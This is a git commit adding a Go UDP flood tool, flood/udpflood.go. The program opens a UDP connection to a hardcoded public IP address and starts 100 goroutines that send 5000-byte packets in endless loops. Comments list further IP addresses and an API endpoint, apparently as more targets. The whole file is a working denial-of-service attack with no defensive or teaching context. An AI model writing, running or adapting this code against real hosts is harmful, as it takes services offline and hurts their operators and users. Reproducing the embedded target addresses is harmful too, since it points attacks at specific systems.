143734bc5e7a0b51dee51fbe2a6046c0920d724d
jjkyuldashov <99941470+jjkyuldashov@users.noreply.github.com>
2022-03-05 17:41:23 +0500

    push

---
+++ flood/udpflood.go
@@ -0,0 +1,48 @@
+package main
+
+import (
+	"crypto/tls"
+	"flag"
+	"fmt"
+	"net"
+	"net/http"
+)
+
+var (
+	_host    = flag.String("h", "195.158.3.34", "Specify Host")
+	_port    = flag.Int("p", 80, "Specify Port")
+	_threads = flag.Int("t", 100, "Specify threads")
+	_size    = flag.Int("s", 5000, "Packet Size")
+)
+
+// 213.230.99.94
+
+// 65507
+
+//https://87.237.235.68:8089/driver_candidate_api/v1/settings
+func main() {
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	flag.Parse()
+
+	fullAddr := fmt.Sprintf("%s:%v", *_host, *_port)
+	//Create send buffer
+	buf := make([]byte, *_size)
+
+	//Establish udp
+	conn, err := net.Dial("udp", fullAddr)
+	if err != nil {
+		fmt.Println(err)
+	} else {
+		fmt.Printf("Flooding %s\n", fullAddr)
+		for i := 0; i < *_threads; i++ {
+			go func() {
+				for {
+					conn.Write(buf)
+				}
+			}()
+		}
+	}
+
+	//Sleep forever
+	<-make(chan bool, 1)
+}
